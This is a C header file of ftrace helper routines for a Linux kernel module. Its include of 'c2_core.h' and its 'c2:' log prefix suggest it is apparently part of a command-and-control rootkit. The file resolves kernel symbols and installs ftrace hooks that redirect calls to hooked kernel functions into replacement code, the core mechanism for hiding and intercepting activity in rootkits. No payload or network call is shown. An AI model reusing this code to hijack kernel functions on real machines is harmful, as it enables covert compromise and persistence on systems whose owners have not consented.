#ifndef FTRACE_HELPER_H
#define FTRACE_HELPER_H

#include "c2_core.h"
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/slab.h>

/* ============================================
   FTRACE HELPER FUNCTIONS
   ============================================ */

static inline int fh_resolve_hook_address(struct ftrace_hook *hook)
{
    hook->address = kallsyms_lookup_name(hook->name);
    if (!hook->address) {
        printk(KERN_ERR "c2: Failed to resolve symbol: %s\n", hook->name);
        return -ENOENT;
    }
    return 0;
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION_5_11
    static void fh_notrace(unsigned long ip, unsigned long parent_ip,
                           struct ftrace_ops *ops, struct ftrace_regs *fregs)
    {
        struct pt_regs *regs = ftrace_get_regs(fregs);
        struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
        
        if (!within_module((unsigned long)ip, THIS_MODULE))
            regs->ip = (unsigned long)hook->function;
    }
#else
    static void fh_notrace(unsigned long ip, unsigned long parent_ip,
                           struct ftrace_ops *ops, struct pt_regs *regs)
    {
        struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
        
        if (!within_module((unsigned long)ip, THIS_MODULE))
            regs->ip = (unsigned long)hook->function;
    }
#endif

static inline int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    
    err = fh_resolve_hook_address(hook);
    if (err)
        return err;
    
    hook->ops.func = fh_notrace;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
    
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        printk(KERN_ERR "c2: Failed to set filter ip: %d\n", err);
        return err;
    }
    
    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk(KERN_ERR "c2: Failed to register ftrace function: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }
    
    return 0;
}

static inline void fh_remove_hook(struct ftrace_hook *hook)
{
    if (!hook->ops.flags)
        return;
    
    unregister_ftrace_function(&hook->ops);
    ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    hook->ops.flags = 0;
}

static inline int install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err, i;
    
    for (i = 0; i < count; i++) {
        err = fh_install_hook(&hooks[i]);
        if (err) {
            printk(KERN_ERR "c2: Failed to install hook %s: %d\n",
                   hooks[i].name, err);
            while (i--)
                fh_remove_hook(&hooks[i]);
            return err;
        }
    }
    return 0;
}

static inline void remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    int i;
    for (i = 0; i < count; i++)
        fh_remove_hook(&hooks[i]);
}

#endif /* FTRACE_HELPER_H */
